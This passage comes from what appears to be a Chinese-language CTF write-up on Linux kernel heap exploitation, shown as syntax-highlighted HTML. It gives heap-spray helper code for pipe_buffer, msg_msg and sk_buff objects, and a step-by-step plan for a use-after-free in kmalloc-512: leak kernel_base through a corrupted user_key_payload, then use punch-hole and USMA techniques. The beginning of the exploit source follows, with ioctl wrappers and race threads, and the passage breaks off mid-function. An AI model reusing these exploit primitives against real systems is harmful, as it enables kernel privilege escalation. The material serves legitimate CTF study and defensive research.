</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">alloc_pipe_buff</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">pipe</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[X] alloc_pipe_buff()&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">change_pipe_buff_size</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">fcntl</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">F_SETPIPE_SZ</span><span class="p">,</span><span class="mh">0x1000</span><span class="o">*</span><span class="p">(</span><span class="n">size</span><span class="o">/</span><span class="mh">0x40</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;fcntl&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">release_pipe_buff</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">close</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[X] release_pipe_buff()&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">close</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[X] release_pipe_buff()&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="msg_msg--kmalloc-cg-0x40">msg_msg (&gt;= kmalloc-cg-0x40)</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">msg_msg</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span> <span class="n">m_list_next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span> <span class="n">m_list_prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span> <span class="n">m_type</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span> <span class="n">m_ts</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span> <span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span> <span class="n">security</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">msg_msgseg</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint64_t</span> <span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">mtype</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">mtext</span><span class="p">[</span><span class="mh">0x4000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">msgbuf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define MSG_COPY 040000
</span></span></span><span class="line"><span class="cl"><span class="cp">#define IPC_NOWAIT 04000
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="n">msgqid</span><span class="p">[</span><span class="mh">0x10000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">add_msg</span><span class="p">(</span><span class="kt">int</span> <span class="n">msqid</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">msgp</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">msgsz</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">msgsnd</span><span class="p">(</span><span class="n">msqid</span><span class="p">,</span> <span class="n">msgp</span><span class="p">,</span> <span class="n">msgsz</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[-] msgsnd&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    	<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">show_msg</span><span class="p">(</span><span class="kt">int</span> <span class="n">msqid</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">msgp</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">msgsz</span><span class="p">,</span><span class="kt">long</span> <span class="n">msgtyp</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">msgrcv</span><span class="p">(</span><span class="n">msqid</span><span class="p">,</span> <span class="n">msgp</span><span class="p">,</span> <span class="n">msgsz</span><span class="p">,</span> <span class="n">msgtyp</span><span class="p">,</span> <span class="n">MSG_COPY</span> <span class="o">|</span> <span class="n">IPC_NOWAIT</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[-] msgrcv&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">free_msg</span><span class="p">(</span><span class="kt">int</span> <span class="n">msqid</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">msgp</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">msgsz</span><span class="p">,</span> <span class="kt">long</span> <span class="n">msgtyp</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">msgrcv</span><span class="p">(</span><span class="n">msqid</span><span class="p">,</span> <span class="n">msgp</span><span class="p">,</span> <span class="n">msgsz</span><span class="p">,</span> <span class="n">msgtyp</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[-] msgrcv&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">msg_get</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="nf">msgget</span><span class="p">(</span><span class="n">IPC_PRIVATE</span><span class="p">,</span> <span class="mo">0666</span> <span class="o">|</span> <span class="n">IPC_CREAT</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">pid</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;msgget&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">pid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">build_msg_msg</span><span class="p">(</span><span class="k">struct</span> <span class="n">msg_msg</span> <span class="o">*</span><span class="n">msg</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">m_list_next</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                   <span class="kt">uint64_t</span> <span class="n">m_list_prev</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">m_type</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="n">m_ts</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">next</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">msg</span><span class="o">-&gt;</span><span class="n">m_list_next</span> <span class="o">=</span> <span class="n">m_list_next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">msg</span><span class="o">-&gt;</span><span class="n">m_list_prev</span> <span class="o">=</span> <span class="n">m_list_prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">msg</span><span class="o">-&gt;</span><span class="n">m_type</span> <span class="o">=</span> <span class="n">m_type</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">msg</span><span class="o">-&gt;</span><span class="n">m_ts</span> <span class="o">=</span> <span class="n">m_ts</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">msg</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">msg</span><span class="o">-&gt;</span><span class="n">security</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">build_msg</span><span class="p">(</span><span class="kt">int</span> <span class="n">num</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">num</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">		<span class="n">msgqid</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">msg_get</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="sk_buffer--kmalloc-cg-0x140">sk_buffer (&gt; kmalloc-cg-0x140)</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">ss</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">][</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">init_sk_buffer</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">socketpair</span><span class="p">(</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ss</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[-] socketpair&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">alloc_sk_buffer</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">write</span><span class="p">(</span><span class="n">ss</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="n">buff</span><span class="p">,</span> <span class="n">size</span><span class="o">-</span><span class="mh">0x140</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[-] write&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">show_skb_buff</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">read</span><span class="p">(</span><span class="n">ss</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span> <span class="n">buff</span><span class="p">,</span> <span class="n">size</span><span class="o">-</span><span class="mh">0x140</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[-] write&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="gfp_kernel">GFP_KERNEL</h3>
<h4 id="user_key_payload-kmalloc-0x20">user_key_payload(&gt;= kmalloc-0x20)</h4>
<h4 id="pg_vec-kmalloc-0x8">pg_vec(&gt;= kmalloc-0x8)</h4>
<p>调试看 <strong>alloc_pg_vec</strong></p>
<h4 id="setxattr任意大小">setxattr(任意大小)</h4>
<h4 id="send_msg-kmalloc-0x8">send_msg(&gt;= kmalloc-0x8)</h4>
<h4 id="poll_list-4k--任意地址">poll_list (4k + 任意地址)</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">create_poll_thread(0,4096 + size,5000,false);
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="漏洞">漏洞</h1>
<p>该题存在 UAF 堆溢出等一系列漏洞</p>
<h2 id="uaf">UAF</h2>
<h3 id="challenge-1">challenge-1</h3>
<p>先从比较简单的设定开始，假设我们可以申请无限制大小的堆块</p>
<h4 id="kmalloc-512">kmalloc-512</h4>
<h5 id="方法1">方法1</h5>
<p>1次add 三次free</p>
<ol>
<li>申请一个 0x200 大小的堆块</li>
<li>释放掉</li>
<li>使用 user_key_payload 占位</li>
<li>释放掉</li>
<li>使用 send_msg 占位 user_key_payload</li>
<li>更改 user_key_payload 的 data_len 为特别大的值泄露 kernel_base</li>
<li>page allocatea占位</li>
<li>task1: 释放掉 然后send_msg触发punch hole,需要在内存的前面写劫持的地址</li>
<li>task2: 触发usma</li>
<li>task3: prepare punch hole</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;banzi.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/prctl.h&gt;  /* Definition of PR_* constants */</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/prctl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">add</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">del</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">idx</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">triger_punch</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">set_cpu_affinity</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">getpid</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">sync_s</span><span class="o">-&gt;</span><span class="n">x1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">sync_s</span><span class="o">-&gt;</span><span class="n">x2</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;triger_punch&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">triger_punch_hole</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">delete_some_struct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">set_cpu_affinity</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">getpid</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">sync_s</span><span class="o">-&gt;</span><span class="n">x3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;triger_add!!!!!!!!!!!!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">start</span> <span class="o">=</span> <span class="nf">rdtsc</span><span class="p">();</span>
